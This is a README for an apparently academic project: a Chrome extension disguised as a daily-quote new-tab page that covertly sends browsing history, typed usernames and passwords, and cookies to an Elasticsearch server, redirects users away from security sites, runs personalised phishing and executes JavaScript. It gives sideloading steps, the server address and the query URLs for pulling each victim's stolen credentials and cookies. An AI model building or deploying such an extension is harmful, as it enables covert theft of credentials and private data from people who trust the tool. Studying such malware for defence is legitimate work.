System-Security-Project 
Malicious Browser Extension with Server Backend

***** Only For Acadmic Purposes ******

This project contains files for creating a chrome extension which to the user appears to replace the new tab page with a page showing a daily quote but underneath it has malicious functionality.

Installation:-
-------------	
	Loading the extension:
	1) Visit chrome://extensions in your browser.

	2) Ensure that the Developer mode checkbox in the top right-hand corner is checked.

	3) Click Load unpacked extension… to pop up a file-selection dialog.

	4) Navigate to the directory in which your extension files live, and select it. For this project
	   the extension files are located in the 'extension' folder

	Server Setup:
	Elasticsearch is used as the backend server and detailed instruction for installation can be found at:
	https://www.elastic.co/guide/en/elasticsearch/reference/current/_installation.html
	
	Elasticsearch is security enabled to use authentication.
	
	Visualization of Elasticsearch is done through Kibana.

Client side configuration:-
--------------------------
	These settings needs to be updated in case a new server is setup.
	Background.js contains three configurations that needs to be set: 
		baseURL - Server URL:Port
		db_username - Username of elastic search
		db_password - Password of elastic search

Current Configuartion:-
----------------------

Elastic Search: http://172.24.17.76:9200
Kibana: http://172.24.17.76:5601/app/kibana
AppSense: http://172.24.17.76:5601/app/sense


Functionality:-
---------------
1) Leak the browsing history of a user to the attacker's server 
    
2) Steal usernames and passwords from forms as the user writes them.

3) Steal cookies from outgoing HTTP requests

4) Routing Users away from security websites to random websites.

5) Personalized Phishing. 
    
6) JavaScript execution.

Elasticsearch Operations:-
-------------------------
Url -> 172.24.17.76
Port -> 9200
Index -> user, history, cookies, credentials, router, dom, js
type -> info, data ('info' is for index 'user', 'data' for every other index)

1. Querying: GET request
From Browser-> http://172.24.17.76:9200/security/test/_search?pretty
From Code-> http://172.24.17.76:9200/security/test/_search

2. Creating Record: POST request
From Code-> 
Sample url: http://172.24.17.76:9200/security/test/
json body: {}

Request:
  "url": "http://172.24.17.76:9200/security/test/",
  "method": "POST",
  "headers": {
    "content-type": "application/json",
    "cache-control": "no-cache",
  }

Record:
{
      "_index" : "security",
      "_type" : "test",
      "_id" : "AVg5-H3Y0n4vlsV07dIk",
      "_score" : 1.0,
      "_source" : {
        "userid" : "user2",
        "status" : "offline"
      }
}
  
3. Updating Record: For updating record you need to know the id for of the record.
Id for the above record: AVg5-H3Y0n4vlsV07dIk
From Code-> 
Sample url: http://172.24.17.76:9200/security/test/AVg5-H3Y0n4vlsV07dIk
json body: {}

Request:
  "url": "http://172.24.17.76:9200/security/test/AVg5-H3Y0n4vlsV07dIk",
  "method": "POST",
  "headers": {
    "content-type": "application/json",
    "cache-control": "no-cache",
  }

4. Deleting Record: DELETE request
Rest client can be used to delete the record based on id.

Sample url: http://172.24.17.76:9200/security/test/AVg5-H3Y0n4vlsV07dIk
json body: {}

Request:
  "url": "http://172.24.17.76:9200/security/test/AVg5-H3Y0n4vlsV07dIk",
  "method": "DELETE",
  "headers": {
    "content-type": "application/json",
    "cache-control": "no-cache",
  }
  

List of All Users:
http://172.24.17.76:9200/user/_search?size=10000


Query User Details:
http://172.24.17.76:9200/user/data/_search?q=info.userid:e0ef185866b72e68b7702027d2fc4775918c4bd1e978544439e3865db19b67c


Query Browsing History for Each User:
http://172.24.17.76:9200/history/data/_search?q=data.userid:c03cbb6278a092abae2cf6f434f24f543a36113f795b472a8c057d1c677c3&size=10000


Query Credentials for Each User:
http://172.24.17.76:9200/credentials/data/_search?q=data.userid:c03cbb6278a092abae2cf6f434f24f543a36113f795b472a8c057d1c677c3&size=10000


Query Phishing Data for Each User:
http://172.24.17.76:9200/credentials/data/_search?q=data.userid:6c5ef8b23d9f57741a7cd4779f2a64a3df6125caf8e81e087cf82abe2636d56%20AND%20data.phishing.email:*&size=10000


Query Password Data for Each User:
http://172.24.17.76:9200/credentials/data/_search?q=data.userid:c03cbb6278a092abae2cf6f434f24f543a36113f795b472a8c057d1c677c3%20AND%20data.password.url:*&size=10000


Query Cookies for Each User:
http://172.24.17.76:9200/cookies/data/_search?q=data.userid:c03cbb6278a092abae2cf6f434f24f543a36113f795b472a8c057d1c677c3&size=10000


Query DOM Object for Each User:
http://172.24.17.76:9200/dom/data/_search?q=data.userid:c03cbb6278a092abae2cf6f434f24f543a36113f795b472a8c057d1c677c3&size=10000


Query JS Object for Each User:
http://172.24.17.76:9200/js/data/_search?q=data.userid:c03cbb6278a092abae2cf6f434f24f543a36113f795b472a8c057d1c677c3&size=10000
